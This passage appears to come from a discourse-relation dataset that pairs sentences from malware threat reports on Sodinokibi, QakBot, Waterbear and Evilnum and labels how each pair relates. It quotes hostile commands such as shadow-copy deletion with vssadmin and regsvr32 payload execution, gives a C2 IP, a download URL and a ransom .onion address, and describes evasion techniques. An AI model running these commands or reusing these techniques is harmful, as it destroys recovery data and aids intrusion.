        "S1": "This file path is calculated based on the current user\u2019s Temp folder location: <temp_dir_path>\\.\\lsm.exe",
        "S2": "- Adds persistence on the system by creating a shortcut in the user\u2019s Startup folder with the correct cmdline arguments:",
        "relation": "NEXT"
    },
    {
        "S1": "- After writing the second stage payload to disk the VBA code performs two important actions.",
        "S2": "- Once the second stage payload has been launched, the VBA Macro proceeds to display a decoy document to the end user.",
        "relation": "NEXT"
    },
    {
        "S1": "This is done so that the cmd.exe process exists as soon as the payload is launched.",
        "S2": "cmdline for executing the second stage binary: cmd.exe /c start /b <temp_dir_path>\\.\\lsm.exe /haobao",
        "relation": "ELABORATION"
    },
    {
        "S1": "cmdline for executing the second stage binary: cmd.exe /c start /b <temp_dir_path>\\.\\lsm.exe /haobao",
        "S2": "- Once the second stage payload has been launched, the VBA Macro proceeds to display a decoy document to the end user.",
        "relation": "NEXT"
    },
    {
        "S1": "- Adds persistence on the system by creating a shortcut in the user\u2019s Startup folder with the correct cmdline arguments:",
        "S2": "- Once the second stage payload has been launched, the VBA Macro proceeds to display a decoy document to the end user.",
        "relation": "MISC"
    },
    {
        "S1": "- Once the second stage payload has been launched, the VBA Macro proceeds to display a decoy document to the end user.",
        "S2": "The decoy document is again written to the user\u2019s temp directory to the following filename/path: <temp_dir_path>\\.\\Job Description.doc",
        "relation": "NEXT"
    },
    {
        "S1": "This decoy document is also stored in the VBA Macro as an encrypted string array (similar to the second stage payload).",
        "S2": "- Once the decoy document has been written to disk, the VBA Macro sets its file attributes to System + Hidden",
        "relation": "ELABORATION"
    },
    {
        "S1": "The decoy document is again written to the user\u2019s temp directory to the following filename/path: <temp_dir_path>\\.\\Job Description.doc",
        "S2": "- The decoy document is then opened by the malicious VBA Macro and the original malicious document\u2019s caption is copied over to the decoy document to trick the end user into mistaking the decoy document for the original (malicious) document.",
        "relation": "NEXT"
    },
    {
        "S1": "- Since the decoy document is a benign file and does not contain any macros the victim does not suspect any malicious behavior.",
        "S2": "The implant has the capability of gathering data from the victim\u2019s system.",
        "relation": "MISC"
    },
    {
        "S1": "If the malware does not find this string in its cmdline arguments, it simply quits without going any further.",
        "S2": "- As part of Reflective DLL loading the malware performs the following tasks on the DLL it has unwrapped in memory:",
        "relation": "MISC"
    },
    {
        "S1": "- Unwraps a DLL into memory and calls its one-and-only import using Reflective DLL injection.",
        "S2": "- As part of Reflective DLL loading the malware performs the following tasks on the DLL it has unwrapped in memory:",
        "relation": "ELABORATION"
    },
    {
        "S1": "- As part of Reflective DLL loading the malware performs the following tasks on the DLL it has unwrapped in memory:",
        "S2": "The implant has the capability of gathering data from the victim\u2019s system.",
        "relation": "MISC"
    },
    {
        "S1": "The implant has the capability of gathering data from the victim\u2019s system.",
        "S2": "- The malware appends an indicator (flag) specifying whether the above registry key was found in the user\u2019s registry:",
        "relation": "MISC"
    },
    {
        "S1": "- The malware appends an indicator (flag) specifying whether the above registry key was found in the user\u2019s registry:",
        "S2": "In preparation of the exfiltration of information collected from the endpoint, the malware performs the following activities:",
        "relation": "NEXT"
    },
    {
        "S1": "- The malware appends an indicator (flag) specifying whether the above registry key was found in the user\u2019s registry:",
        "S2": "Persistence is established for the implant via the visual basic macro code initially executed upon document loading by the victim.",
        "relation": "MISC"
    },
    {
        "S1": "In preparation of the exfiltration of information collected from the endpoint, the malware performs the following activities:",
        "S2": "Once the malware has performed all these activities it sends an HTTP POST request to the CnC server:",
        "relation": "NEXT"
    },
    {
        "S1": "In preparation of the exfiltration of information collected from the endpoint, the malware performs the following activities:",
        "S2": "Value written to registry to achieve persistence on the endpoint:",
        "relation": "MISC"
    },
    {
        "S1": "The persistence mechanism of the malware is performed only for the downloaded implant.",
        "S2": "This persistence is also performed ONLY if the malware successfully executes the downloaded implant.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Spearphishing Attachment (ATT&CK T1193) is one of the most used Initial Access techniques used by ransomware families as in Sodinokibi.",
        "S2": "In order to show the lifecycle of Sodinokibi ransomware, we analyzed a Microsoft Word document.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Attackers use spam emails with an attached MS Office Word document including a malicious macro to download the ransomware to the target system.",
        "S2": "\u201cBewerbungsunterlagen\u201d means \u201capplication document\u201d in German, and the attackers used a CV theme to lure victims into downloading the document.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Attackers use spam emails with an attached MS Office Word document including a malicious macro to download the ransomware to the target system.",
        "S2": "It reveals that a macro is embedded in the document (Scripting, ATT&CK T1054).",
        "relation": "ELABORATION"
    },
    {
        "S1": "In order to show the lifecycle of Sodinokibi ransomware, we analyzed a Microsoft Word document.",
        "S2": "\u201cBewerbungsunterlagen\u201d means \u201capplication document\u201d in German, and the attackers used a CV theme to lure victims into downloading the document.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In order to show the lifecycle of Sodinokibi ransomware, we analyzed a Microsoft Word document.",
        "S2": "Supply Chain Compromise ( ATT&CK T1195) : Sodinokibi ransomware was distributed through a compromised version of WinRAR downloaded from the WinRAR Italia website.",
        "relation": "MISC"
    },
    {
        "S1": "In order to show the lifecycle of Sodinokibi ransomware, we analyzed a Microsoft Word document.",
        "S2": "Even though Sodinokibi uses simple obfuscation techniques mentioned below, 30 of 60 antiviruses cannot detect it.",
        "relation": "MISC"
    },
    {
        "S1": "In order to show the lifecycle of Sodinokibi ransomware, we analyzed a Microsoft Word document.",
        "S2": "When a victim opens the document, Microsoft Word asks to enable/disable macros.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In order to show the lifecycle of Sodinokibi ransomware, we analyzed a Microsoft Word document.",
        "S2": "When we accessed the website, we saw the following page that wants 0,6346 Bitcoin worth $5,000.",
        "relation": "MISC"
    },
    {
        "S1": "Even though Sodinokibi uses simple obfuscation techniques mentioned below, 30 of 60 antiviruses cannot detect it.",
        "S2": "Sodinokibi is a \u201cRansomware-as-a-Service (RAAS) malware, so its distribution methods vary depending on the attacker distributing it.",
        "relation": "MISC"
    },
    {
        "S1": "Remote Desktop Protocol ( ATT&CK T1076) : Attackers use RDP to deliver Sodinokibi.",
        "S2": "Supply Chain Compromise ( ATT&CK T1195) : Sodinokibi ransomware was distributed through a compromised version of WinRAR downloaded from the WinRAR Italia website.",
        "relation": "LIST"
    },
    {
        "S1": "This delivery technique can also be classified in External Remote Services ( ATT&CK T1133).",
        "S2": "When a victim opens the document, Microsoft Word asks to enable/disable macros.",
        "relation": "MISC"
    },
    {
        "S1": "Supply Chain Compromise ( ATT&CK T1195) : Sodinokibi ransomware was distributed through a compromised version of WinRAR downloaded from the WinRAR Italia website.",
        "S2": "As seen in the above process graph, the macro in the Word document downloads and runs Sodinokibi executable.",
        "relation": "MISC"
    },
    {
        "S1": "Drive-by-Compromise ( ATT&CK T1189): Attackers compromised WordPress sites and injected JavaScript over the content of the original site to spread Sodinokibi.",
        "S2": "As far as I know, unfortunately there are no decryption tools to restore data encrypted by Sodinokibi ransomware.",
        "relation": "MISC"
    },
    {
        "S1": "When a victim opens the document, Microsoft Word asks to enable/disable macros.",
        "S2": "The malicious document claims that it was created in an earlier version of Microsoft Office and asks the victim to enable the content, which launches the code hidden in the macros.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malicious document claims that it was created in an earlier version of Microsoft Office and asks the victim to enable the content, which launches the code hidden in the macros.",
        "S2": "Its artifacts usually mimic the names of known executables for Defense Evasion, such as a Microsoft Word update file name (MicrosoftOfficeWord_upd.v.88735.34.5.exe) as in this sample (Masquerading, ATT&CK T1036).",
        "relation": "MISC"
    },
    {
        "S1": "When we examined macros in the document, we saw that VBA (Visual Basic for Applications) codes were split into modules and functions for the purpose of obfuscation (Obfuscate",
        "S2": "As seen in the above process graph, the macro in the Word document downloads and runs Sodinokibi executable.",
        "relation": "MISC"
    },
    {
        "S1": "As we know the fU1 and fP1 parameters, we can understand the following function:",
        "S2": "Accordingly, this function downloads de1.trp from 54.39.233.132 and saves it to the C:\\Windows\\Temp\\ directory as MicrosoftOfficeWord_upd.v.88735.34.5.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As seen in the above process graph, the macro in the Word document downloads and runs Sodinokibi executable.",
        "S2": "Like most ransomware, Sodinokibi encrypts files and adds a random extension such as \u201ctest.jpg.1cd8t9ahd5\u201d (Data Encrypted for Impact, ATT&CK T1486).",
        "relation": "NEXT"
    },
    {
        "S1": "At first, this command runs vssadmin.exe to delete all volume shadow copies on the system to prevent recovery (Inhibit System Recovery, ATT&CK T1490) vssadmin.exe Delete Shadows /All /Quiet",
        "S2": "Then, it uses bcdedit.exe twice to disable automatic Windows recovery features by modifying boot configuration data (Inhibit System Recovery, ATT&CK T1490)",
        "relation": "NEXT"
    },
    {
        "S1": "Then, it uses bcdedit.exe twice to disable automatic Windows recovery features by modifying boot configuration data (Inhibit System Recovery, ATT&CK T1490)",
        "S2": "The name of the ransom note is the random extension added to the encrypted files.",
        "relation": "MISC"
    },
    {
        "S1": "Like most ransomware, Sodinokibi encrypts files and adds a random extension such as \u201ctest.jpg.1cd8t9ahd5\u201d (Data Encrypted for Impact, ATT&CK T1486).",
        "S2": "Sodinokibi uses AES encryption to encrypt the private keys, and Salsa20 for encrypting files.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The name of the ransom note is the random extension added to the encrypted files.",
        "S2": "The ransom note recommends accessing the attacker\u2019s website over the TOR browser: hxxp://aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd.onion/C2D97495C4BA3647",
        "relation": "ELABORATION"
    },
    {
        "S1": "The ransom note recommends accessing the attacker\u2019s website over the TOR browser: hxxp://aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd.onion/C2D97495C4BA3647",
        "S2": "In the \u201cABOUT US\u201d section on their website, they claim that they developed the best data encryption and decryption system available today.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When we accessed the website, we saw the following page that wants 0,6346 Bitcoin worth $5,000.",
        "S2": "In the \u201cABOUT US\u201d section on their website, they claim that they developed the best data encryption and decryption system available today.",
        "relation": "MISC"
    },
    {
        "S1": "I am sure they did not develop the best encryption method, but they use multiple encryption by encrypting files and also the private keys.",
        "S2": "Sodinokibi uses AES encryption to encrypt the private keys, and Salsa20 for encrypting files.",
        "relation": "ELABORATION"
    },
    {
        "S1": "I am sure they did not develop the best encryption method, but they use multiple encryption by encrypting files and also the private keys.",
        "S2": "As far as I know, unfortunately there are no decryption tools to restore data encrypted by Sodinokibi ransomware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The hallmarks of a QakBot infection chain consist of a phishing lure (T1566) delivered via email chain hijacking or spoofed emails that contain context-aware information such as shipping, work orders, urgent requests, invoices, claims, etc.",
        "S2": "QakBot is often used as a gateway entry, similar to TrickBot or Emotet, that leads to post exploitation operations leveraging frameworks such as Cobalt Strike as well as delivering Ransomware.",
        "relation": "MISC"
    },
    {
        "S1": "Figure 1 below illustrates an example of a recent QakBot lure with the subject \u201cRe: SIGNED QUOTE\u201d and a ZIP file attachment labeled \u201cCancellation_Letter_272020508-02242021.zip\u201d.",
        "S2": "A representative sample, 78ea3550e2697cd06b07df568242f7fc9f57e4d2b297b74f6ce26e97613de53a, seen in a recent QakBot campaign is shown in Figure 2 below.",
        "relation": "MISC"
    },
    {
        "S1": "The actors further establish the trust and confidence of the targeted user by presenting a semi-official looking DocuSign graphic that guides the user through the process of enabling the Excel 4 Macros.",
        "S2": "QakBot Excel spreadsheets often contain hidden spreadsheets, Excel 4.0 macros, spreadsheet formulas, and BIFF records all designed to pass a visual inspection from the user with the added benefit of bypassing detection mechanisms that attempt to parse multiple legacy formats inside the spreadsheet.",
        "relation": "ELABORATION"
    },
    {
        "S1": "QakBot Excel spreadsheets often contain hidden spreadsheets, Excel 4.0 macros, spreadsheet formulas, and BIFF records all designed to pass a visual inspection from the user with the added benefit of bypassing detection mechanisms that attempt to parse multiple legacy formats inside the spreadsheet.",
        "S2": "Once the Excel 4.0 macro is decoded it is possible to see the CALL to URLDownloadToFileA, which downloads the QakBot DLL in this campaign from http[:]//rlyrt26rnxw02vqijgs[.]com/fera/frid[.]gif.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the Excel 4.0 macro is decoded it is possible to see the CALL to URLDownloadToFileA, which downloads the QakBot DLL in this campaign from http[:]//rlyrt26rnxw02vqijgs[.]com/fera/frid[.]gif.",
        "S2": "It is also a common tactic for QakBot to execute \u201cregsvr32.exe -s nxckew.wle,DllRegisterServer\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "It is also a common tactic for QakBot to execute \u201cregsvr32.exe -s nxckew.wle,DllRegisterServer\u201d.",
        "S2": "A representative QakBot DLL analyzed by Alien Labs, 9a353d4b85b3097762282703f1807c2b459698966b967280c8e4e13cc56d2e28, has two exports: the entry point (0x10005a5d) and DllRegisterServer (0x10029c88)and if DllRegisterServer is not called via regsvr32.exe or rundll32.exe with command line options, then only the entry point is called and the malicious code in DllRegisterServer is not called.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A representative QakBot DLL analyzed by Alien Labs, 9a353d4b85b3097762282703f1807c2b459698966b967280c8e4e13cc56d2e28, has two exports: the entry point (0x10005a5d) and DllRegisterServer (0x10029c88)and if DllRegisterServer is not called via regsvr32.exe or rundll32.exe with command line options, then only the entry point is called and the malicious code in DllRegisterServer is not called.",
        "S2": "Alien Labs has identified 42 unique signers and signature serial numbers, which are included in Detection Methods section to aid in detection and hunting with YARA and Osquery.",
        "relation": "MISC"
    },
    {
        "S1": "A representative QakBot DLL analyzed by Alien Labs, 9a353d4b85b3097762282703f1807c2b459698966b967280c8e4e13cc56d2e28, has two exports: the entry point (0x10005a5d) and DllRegisterServer (0x10029c88)and if DllRegisterServer is not called via regsvr32.exe or rundll32.exe with command line options, then only the entry point is called and the malicious code in DllRegisterServer is not called.",
        "S2": "The results of our additional de-obfuscation efforts are confirmed when the QakBot Excel spreadsheet is run inside a sandbox in Figure 4 below.",
        "relation": "MISC"
    },
    {
        "S1": "The results of our additional de-obfuscation efforts are confirmed when the QakBot Excel spreadsheet is run inside a sandbox in Figure 4 below.",
        "S2": "Before executing the main payload, the QakBot loader will first test the infected system to see if it is a good candidate for infection.",
        "relation": "MISC"
    },
    {
        "S1": "An example of this can be seen in Figure 6 below, which shows QakBot decrypting a string containing the value for lpProcName passed as a parameter to the GetProcAddress API call.",
        "S2": "When executed, QakBot will check whether it has previously been executed on the machine by checking for the specified malware folder.",
        "relation": "MISC"
    },
    {
        "S1": "Specifically, QakBot checks the system for the names of running processes that match the strings listed in Table 1 below.",
        "S2": "QakBot will also add its folder to the Windows Defender exclusions setting located in the Registry (T1112), which prevents Defender from scanning QakBot artifacts.",
        "relation": "NEXT"
    },
    {
        "S1": "QakBot will also add its folder to the Windows Defender exclusions setting located in the Registry (T1112), which prevents Defender from scanning QakBot artifacts.",
        "S2": "In addition to the previously mentioned environment check, QakBot collects system information (T1082) such as computer name, system directories, user profiles, and more, which is shown in Figure 10 below.",
        "relation": "NEXT"
    },
    {
        "S1": "If it is unsuccessful then QakBot will attempt to inject itself into mobsync.exe or iexplore.exe.",
        "S2": "Finally, if the QakBot loader has verified its execution environment has passed its tests, then QakBot will proceed to decrypt and execute the main QakBot payload, which is hidden as resource \u201c307\u201d.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "The decryption and import table resolution of its main payload is shown in Figure 15 below.",
        "S2": "Despite the limitations and challenges presented by QakBot DLLs there is ample opportunity to detect QakBot loaders signed by revoked and blacklisted malicious certificates.",
        "relation": "MISC"
    },
    {
        "S1": "Upon execution, Sodinokibi will create a mutex with a hardcoded name Global\\206D87E0-0E60-DF25-DD8F-8E4E7D1E3BF0 and decrypt an embedded configuration.",
        "S2": "Sodinokibi gathers some basic system information and saves it to the registry together with the generated encryption parameters.",
        "relation": "NEXT"
    },
    {
        "S1": "If not configured to execute the exploit, or if the attempt is unsuccessful, it will instead try to re-run itself as an administrator.",
        "S2": "If the dbg option is not set in the config, the UI language and keyboard layout values are checked, and the malware will simply exit on systems which use one of the following language codes:",
        "relation": "IF_ELSE"
    },
    {
        "S1": "Sodinokibi gathers some basic system information and saves it to the registry together with the generated encryption parameters.",
        "S2": "If the system language is not one of the excluded languages, Sodinokibi will terminate all processes specified by the prc value in the config and delete volume shadow copies before starting the file encryption routine.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the dbg option is not set in the config, the UI language and keyboard layout values are checked, and the malware will simply exit on systems which use one of the following language codes:",
        "S2": "The malware will exit only if the keyboard layout value belongs to these countries, but the OS language value is equal to one of the remaining languages.",
        "relation": "ELABORATION"
    },
    {
        "S1": "If the dbg option is not set in the config, the UI language and keyboard layout values are checked, and the malware will simply exit on systems which use one of the following language codes:",
        "S2": "The ransomware will then proceed to encrypt all files on local drives, skipping files and folders included on the config\u2019s exception list.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware will exit only if the keyboard layout value belongs to these countries, but the OS language value is equal to one of the remaining languages.",
        "S2": "The ransomware will then proceed to encrypt all files on local drives, skipping files and folders included on the config\u2019s exception list.",
        "relation": "NEXT"
    },
    {
        "S1": "If the system language is not one of the excluded languages, Sodinokibi will terminate all processes specified by the prc value in the config and delete volume shadow copies before starting the file encryption routine.",
        "S2": "The file encryption routine is discussed in detail in the \u201cFile encryption\u201d section.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The ransomware will then proceed to encrypt all files on local drives, skipping files and folders included on the config\u2019s exception list.",
        "S2": "The contents of the README file, as well as the ransom message, are again specified in the config.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Unless the executable was run with -nolan command line parameter, the malware will also attempt to encrypt files on network shares.",
        "S2": "Other parameters from the configuration that affect the malware\u2019s behavior are wipe (if set, all the files in folders listed under wfld will be zeroed out and deleted) and net (if set, the ransomware will broadcast the victim's system information to a range of domains listed in the dmn value in the config).",
        "relation": "NEXT"
    },
    {
        "S1": "The contents of the README file, as well as the ransom message, are again specified in the config.",
        "S2": "Other parameters from the configuration that affect the malware\u2019s behavior are wipe (if set, all the files in folders listed under wfld will be zeroed out and deleted) and net (if set, the ransomware will broadcast the victim's system information to a range of domains listed in the dmn value in the config).",
        "relation": "MISC"
    },
    {
        "S1": "We saw a Waterbear loader named \"ociw32.dll\" inside one of the folders in the %PATH% environmental variable.",
        "S2": "During our investigation, we noticed that the value \"OracleOciLib\" was deleted from the victim's machine, as shown in Figure 2.",
        "relation": "MISC"
    },
    {
        "S1": "We saw a Waterbear loader named \"ociw32.dll\" inside one of the folders in the %PATH% environmental variable.",
        "S2": "Because there is no \"OracleOciLib\" value, it loads the hardcoded DLL \"ociw32.dll\" instead, which triggers the malicious Waterbear DLL loader.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This DLL name is hardcoded inside \"mtxoci.dll\" which is loaded by the MSDTC service during boot-up.",
        "S2": "Hence, the malicious loader \"ociw32.dll\" was loaded and successfully executed on the host.",
        "relation": "MISC"
    },
    {
        "S1": "\u201cmtxoci.dll\u201d first tries to query the registry key \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSDTC\\MTxOCI\" to see if the value \"OracleOciLib\" exists.",
        "S2": "If the value doesn't exist, \u201cmtxoci.dll\u201d tries to load \"ociw32.dll\" instead.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "During our investigation, we noticed that the value \"OracleOciLib\" was deleted from the victim's machine, as shown in Figure 2.",
        "S2": "During our investigation, we found a peculiar incident that stands out from most of the Waterbear infections we\u2019ve previously seen.",
        "relation": "MISC"
    },
    {
        "S1": "Hence, the malicious loader \"ociw32.dll\" was loaded and successfully executed on the host.",
        "S2": "Because there is no \"OracleOciLib\" value, it loads the hardcoded DLL \"ociw32.dll\" instead, which triggers the malicious Waterbear DLL loader.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After the Waterbear DLL loader is executed, it searches for a hardcoded path and tries to decrypt the corresponding payload, which is a piece of encrypted shellcode.",
        "S2": "In this case, the intention of the malicious code is to hide Waterbear\u2019s backdoor activities from the security product.",
        "relation": "MISC"
    },
    {
        "S1": "After the Waterbear DLL loader is executed, it searches for a hardcoded path and tries to decrypt the corresponding payload, which is a piece of encrypted shellcode.",
        "S2": "Whenever \u201cZwOpenProcess\u201d is called, the injected code will first check if the opened process hits any PIDs in the protected process ID list.",
        "relation": "MISC"
    },
    {
        "S1": "After the Waterbear DLL loader is executed, it searches for a hardcoded path and tries to decrypt the corresponding payload, which is a piece of encrypted shellcode.",
        "S2": "If the decrypted payload is valid, it picks a specific existing Windows Service \u2014 LanmanServer, which is run by svchost.exe \u2014 and injects the decrypted shellcode into the legitimate service.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "During our investigation, we found a peculiar incident that stands out from most of the Waterbear infections we\u2019ve previously seen.",
        "S2": "Meanwhile, the second payload is a typical Waterbear first-stage backdoor.",
        "relation": "MISC"
    },
    {
        "S1": "This time, the DLL loader loaded two payloads \u2013 the first payload performed functionalities we have not seen before: It injected codes into a specific security product to do API hooking in order to hide the backdoor from the product.",
        "S2": "We have observed that the loader tried to read the payloads from the files, decrypted them, and performed thread injections with the following conditions:",
        "relation": "ELABORATION"
    },
    {
        "S1": "This time, the DLL loader loaded two payloads \u2013 the first payload performed functionalities we have not seen before: It injected codes into a specific security product to do API hooking in order to hide the backdoor from the product.",
        "S2": "In the first injected thread, if the necessary executable from the security product was not found, the thread would be terminated without performing other malicious routines.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This time, the DLL loader loaded two payloads \u2013 the first payload performed functionalities we have not seen before: It injected codes into a specific security product to do API hooking in order to hide the backdoor from the product.",
        "S2": "In order to hide the behaviors of the first-stage backdoor (which is the second payload), the first payload uses API hooking techniques to avoid being detected by a specific security product and to make an interference in the result of the function execution.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This time, the DLL loader loaded two payloads \u2013 the first payload performed functionalities we have not seen before: It injected codes into a specific security product to do API hooking in order to hide the backdoor from the product.",
        "S2": "Both payloads were encrypted and stored on the victim\u2019s disk and were injected into the same service, which was, in this case, LanmanServer.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This time, the DLL loader loaded two payloads \u2013 the first payload performed functionalities we have not seen before: It injected codes into a specific security product to do API hooking in order to hide the backdoor from the product.",
        "S2": "Regardless if the API hooking was performed or otherwise, the second backdoor would still be executed after having been successfully loaded.",
        "relation": "NEXT"
    },
    {
        "S1": "This time, the DLL loader loaded two payloads \u2013 the first payload performed functionalities we have not seen before: It injected codes into a specific security product to do API hooking in order to hide the backdoor from the product.",
        "S2": "If the first payload could not be found on the disk, the loader would be terminated without loading the second one.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "Meanwhile, the second payload is a typical Waterbear first-stage backdoor.",
        "S2": "If the first payload could not be found on the disk, the loader would be terminated without loading the second one.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Both payloads were encrypted and stored on the victim\u2019s disk and were injected into the same service, which was, in this case, LanmanServer.",
        "S2": "If the first payload was successfully decrypted and injected into the service, the second piece would also be loaded and injected regardless of what happened to the first thread.",
        "relation": "NEXT"
    },
    {
        "S1": "Both payloads were encrypted and stored on the victim\u2019s disk and were injected into the same service, which was, in this case, LanmanServer.",
        "S2": "If the first payload could not be found on the disk, the loader would be terminated without loading the second one.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the first payload was successfully decrypted and injected into the service, the second piece would also be loaded and injected regardless of what happened to the first thread.",
        "S2": "In order to hide the behaviors of the first-stage backdoor (which is the second payload), the first payload uses API hooking techniques to avoid being detected by a specific security product and to make an interference in the result of the function execution.",
        "relation": "NEXT"
    },
    {
        "S1": "If the first payload was successfully decrypted and injected into the service, the second piece would also be loaded and injected regardless of what happened to the first thread.",
        "S2": "Regardless if the API hooking was performed or otherwise, the second backdoor would still be executed after having been successfully loaded.",
        "relation": "NEXT"
    },
    {
        "S1": "If the first payload was successfully decrypted and injected into the service, the second piece would also be loaded and injected regardless of what happened to the first thread.",
        "S2": "Note that only the thread would be terminated, but the service would still be running.",
        "relation": "MISC"
    },
    {
        "S1": "In the first injected thread, if the necessary executable from the security product was not found, the thread would be terminated without performing other malicious routines.",
        "S2": "In this case, the intention of the malicious code is to hide Waterbear\u2019s backdoor activities from the security product.",
        "relation": "MISC"
    },
    {
        "S1": "In order to hide the behaviors of the first-stage backdoor (which is the second payload), the first payload uses API hooking techniques to avoid being detected by a specific security product and to make an interference in the result of the function execution.",
        "S2": "Although in this case, the affected process is specified in the first-stage shellcode, the API hooking logic is quite generic that the same piece of shellcode can be used to hook other vendors' products.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The second-stage shellcode then performs API hooking inside the targeted process.",
        "S2": "If the shared memory doesn't exist, it takes the PID embedded by the first-stage shellcode.",
        "relation": "MISC"
    },
    {
        "S1": "The second-stage shellcode then performs API hooking inside the targeted process.",
        "S2": "Therefore, the first-stage shellcode takes the PID of the Windows Service \u2014 which the first-stage shellcode and the succeeding backdoor both inject into \u2014 hides the target process, and embeds that PID into the second-stage shellcode.",
        "relation": "MISC"
    },
    {
        "S1": "If the shared memory doesn't exist, it takes the PID embedded by the first-stage shellcode.",
        "S2": "Therefore, the first-stage shellcode takes the PID of the Windows Service \u2014 which the first-stage shellcode and the succeeding backdoor both inject into \u2014 hides the target process, and embeds that PID into the second-stage shellcode.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this case, the intention of the malicious code is to hide Waterbear\u2019s backdoor activities from the security product.",
        "S2": "The purpose of hooking \u201cZwOpenProcess\u201d is to protect the specific process from being accessed by the security product.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this case, the intention of the malicious code is to hide Waterbear\u2019s backdoor activities from the security product.",
        "S2": "If any record contains the PID Waterbear wants to hide, it will remove the corresponding record, modify the record number inside the table, and continue to check the succeeding records.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Therefore, the first-stage shellcode takes the PID of the Windows Service \u2014 which the first-stage shellcode and the succeeding backdoor both inject into \u2014 hides the target process, and embeds that PID into the second-stage shellcode.",
        "S2": "If yes, it modifies the process ID, which should open on another Windows Service PID.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This function includes two parts, as shown in Figure 9:",
        "S2": "It recursively checks if the PID to be opened by \u201cZwOpenProcess\u201d is in the list of the protected process IDs.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The PID checking procedure.",
        "S2": "After the PID checking procedure, it executes the original \u201cZwOpenProcess\u201d and returns the result.",
        "relation": "NEXT"
    },
    {
        "S1": "The second part of API hooking hooks on \u201cGetExtendedTcpTable.\u201d",
        "S2": "The purpose of the hook is to remove TCP endpoint records of certain PIDs.",
        "relation": "NEXT"
    },
    {
        "S1": "After that, it jumps to \u201cGetExtendedTcpTable\u201d to execute the function normally and to catch its return values.",
        "S2": "After \u201cGetExtendedTcpTable\u201d is executed and the process returns back to the second part of the code",
        "relation": "NEXT"
    },
    {
        "S1": "That archive contains several LNK (aka shortcut) files that extract and execute a malicious JavaScript component, while displaying a decoy document.",
        "S2": "Then this malicious JavaScript file is executed and it writes and opens a decoy file with the same name as the shortcut, but with the correct extension.",
        "relation": "NEXT"
    },
    {
        "S1": "It also deletes the shortcut file.",
        "S2": "The JavaScript component is the first stage of the attack and can deploy other malware such as a C# spy component, Golden Chickens components or several Python-based tools.",
        "relation": "MISC"
    },
    {
        "S1": "The documents used as decoys are mostly photos of credit cards, identity documents, or bills with proof of address, as many financial institutions require these documents from their customers when they join, according to regulations (this is known as \u201cKnow Your Customer\u201d).",
        "S2": "These decoy documents seem genuine, and we assume that they have been collected by this group during years of operation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The group reuses the documents on different targets, unless the targets are from different regions.",
        "S2": "We have named the group Evilnum as that is the name of their flagship malware, and we\u2019ll refer to the various malware pieces as components.",
        "relation": "MISC"
    },
    {
        "S1": "The name Evilnum was given to the C# component by other researchers in the past, but the JS component also has been referred to as Evilnum.",
        "S2": "This component achieves persistence through the Run registry key and has full backdoor capabilities: it can download and execute binaries, run arbitrary commands or upload files from the victim computer to the C&C server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We have named the group Evilnum as that is the name of their flagship malware, and we\u2019ll refer to the various malware pieces as components.",
        "S2": "The operators of the malware manually send commands to install additional components and use post-compromise scripts and tools if they consider them necessary.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The operators of the malware manually send commands to install additional components and use post-compromise scripts and tools if they consider them necessary.",
        "S2": "However, in most attacks that we have seen, the attackers deployed additional components as they saw fit and used the JS malware only as a first stage.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Most servers used by the malware are referenced by IP addresses; domain names have not been used.",
        "S2": "However, in most attacks that we have seen, the attackers deployed additional components as they saw fit and used the JS malware only as a first stage.",
        "relation": "MISC"
    },
    {
        "S1": "The malware has changed since then and we illustrate these changes in Figure 4.",
        "S2": "Also, as new versions appeared, the malware was extended with some Python scripts (see the Post-compromise toolset section) and external tools such as ChromeCookiesView.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Differences between version 1.3 and the others are noteworthy, as the server-side code for the C&C was changed and commands are different.",
        "S2": "The following capabilities are present in version 4.0:",
        "relation": "MISC"
    },
    {
        "S1": "Differences between version 1.3 and the others are noteworthy, as the server-side code for the C&C was changed and commands are different.",
        "S2": "Despite the differences, the core functionalities remain the same in all versions, including the retrieval of the C&C server\u2019s address from GitHub, GitLab or Reddit pages created specifically for that purpose.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Also, as new versions appeared, the malware was extended with some Python scripts (see the Post-compromise toolset section) and external tools such as ChromeCookiesView.",
        "S2": "Figure 5 shows an example of a Reddit page that is parsed by the malware to retrieve a C&C address.",
        "relation": "MISC"
    },
    {
